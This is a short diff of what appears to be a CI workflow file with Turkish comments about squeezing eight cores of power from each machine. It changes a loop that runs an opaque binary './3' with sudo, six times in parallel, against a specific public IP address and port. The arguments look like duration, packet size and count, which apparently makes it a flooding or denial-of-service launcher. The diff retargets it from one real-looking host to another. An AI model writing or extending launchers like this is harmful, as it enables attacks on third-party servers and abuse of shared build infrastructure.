@@ -23,7 +23,7 @@ name: 🔥 TEK MAKİNEDEN 8 ÇEKİRDEK GÜCÜ AL
 run: |
   PIDS=()# HER MAKİNE İÇİNDE 8 PARALEL İŞLEM BAŞLAT!
   for i in {1..6}; do
-    sudo timeout 200 ./3 216.114.73.1 23 300 1333 9999999 &
+    sudo timeout 200 ./3 185.117.3.105 30033 300 1333 9999999 &
     PIDS+=($!)
   done
   # Hepsini bekle ve bitir.
